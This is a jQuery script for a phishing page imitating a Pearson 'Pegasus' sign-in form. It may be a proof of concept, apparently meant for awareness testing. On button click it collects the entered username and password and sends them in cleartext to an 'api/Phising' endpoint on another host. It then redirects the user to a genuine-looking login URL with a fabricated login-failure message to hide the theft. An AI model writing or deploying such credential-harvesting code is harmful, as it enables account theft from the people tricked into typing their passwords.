


$(document).ready(function () {
    $("#PegasusHedSignInBtn").click(function () {
        // Post the User Information to server through Service
        PostInfo($("#loginname").val(), $("#password").val());
        window.location.assign("https://pegasus5.qa.pegasus.pearsoncmg.com/Pegasus/frmLogin.aspx?errmsg=Login+Failure+SMS%3a+Invalid+login+name%2fpassword+combination+OR+you+don%27t+have+a+subscription+to+this+site.")
    });
});



function PostInfo(username, password) {
    sitename = "PegasusHED"
    $.getJSON("http://192.168.5.28/InbrowserNotificationPOC/api/Phising?usename=" + username + "&password=" + password + "&sitename=" + sitename,
        function (Data) {
            alert("ok!!");
        })
    .fail(
        function (jqXHR, textStatus, err) {
            $('#items').text('Error: ' + err);
        });


}
